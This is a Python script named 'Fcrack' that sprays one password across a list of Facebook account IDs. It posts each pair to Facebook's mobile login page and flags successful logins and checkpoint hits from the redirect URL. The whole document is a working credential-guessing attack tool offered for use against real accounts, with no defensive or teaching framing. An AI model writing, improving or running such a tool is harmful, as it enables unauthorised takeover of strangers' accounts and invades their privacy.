#!/usr/bin/python2

import sys, os, requests

if sys.platform in ["linux", "linux2"]:
	w = "\033[0m"
	r = "\033[31;1m"
	g = "\033[32;1m"
	y = "\033[33;1m"
	b = "\033[34;1m"
	p = "\033[35;1m"
	c = "\033[36;1m"

else:
	w = ""
	r = ""
	g = ""
	y = ""
	b = ""
	p = ""
	c = ""

logo = """
%s000000000000 
0000%s11111%s000 
000%s11%s0000000 
00%s11111%s00000 
000%s11%s0000000 
000%s11%s0000000 
000%s11%s0000000 
000000000000%s Fcrack %sv.0.2  
%s==============[ %sinfo%s ]=================
github : %shttps://github.com/mrforfun%s
author : %sMR.4FUN%s
team   : to%sX%ssec 
code   : %spython%s
=======================================
"""%(b,w,b,w,b,w,b,w,b,w,b,w,b,w,b,w,g,w,r,w,g,w,r,w,b,w)

def brute(id,pw):
	link = "https://m.facebook.com/login.php"
	data = {"email":id, "pass":pw}
	r = requests.post(link, data=data)
	if "save-device" in r.url or "m_sess" in r.url:
		print("%s[ %sfound%s ] new %s~> %s"%(w,r,w,g,w)+ id + "%spass %s~> "%(w,g)+ w + pw)
	elif "checkpoint" in r.url:
		print("%s[ %swarning%s ] checkpoint %s~> "%(w,y,w,g)+ w + id)
	else:
		print("%s[ %sinfo%s ] fail %s~> "%(w,b,w,g)+ w + id)

def list(file,pw):
	file = open(file, "r").readlines()
	for i in file:
		brute(i.strip(),pw)

if __name__ == '__main__':
	if sys.version[0] in "3":
		next
	else:
		print("[ info ] please use python version 3.*")	
		exit()

	print(logo)
	print(" example id.txt")
	id = input("%s[ %sinput%s ] Enter the id list : "%(w,c,w))
	pw = input("%s[ %sinput%s ] password to crack : "%(w,c,w))
	o = open(id, "r").readlines()
	print("%s[ %sinfo%s ] Loaded %s ID friends"%(w,b,w,len(o)))
	print("%s[ %sinfo%s ] cracking with pass "%(w,b,w) + pw)
	list(id,pw)

